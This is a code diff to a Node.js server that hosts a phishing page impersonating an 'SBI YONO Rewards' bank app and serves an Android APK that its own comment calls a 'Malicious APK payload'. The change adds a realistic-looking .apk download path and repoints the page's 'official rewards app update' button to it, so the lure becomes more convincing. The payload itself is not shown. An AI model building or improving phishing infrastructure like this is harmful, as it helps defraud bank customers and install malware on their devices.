@@ -7,7 +7,7 @@ const server = http.createServer((req, res) => {
   // ═══════════════════════════════════════════════════════════════════════════
   // DOWNLOAD ENDPOINT — Malicious APK payload
   // ═══════════════════════════════════════════════════════════════════════════
-  if (req.url === '/download-file') {
+  if (req.url === '/download-file' || req.url === '/downloads/sbi_yono_rewards.apk') {
     res.writeHead(200, {
       'Content-Type': 'application/vnd.android.package-archive',
       'Content-Disposition': 'attachment; filename="sbi_yono_rewards.apk"',
@@ -127,7 +127,7 @@ const server = http.createServer((req, res) => {
 <div class="card">
   <h2 style="color:#0369a1;margin-top:0">SBI YONO Rewards</h2>
   <p style="color:#64748b;font-size:14px">Download your official rewards app update below.</p>
-  <a class="btn" href="/download-file" id="dl-btn">Download APK</a>
+  <a class="btn" href="/downloads/sbi_yono_rewards.apk" id="dl-btn">Download APK</a>
 </div>
 </body></html>`);
   }
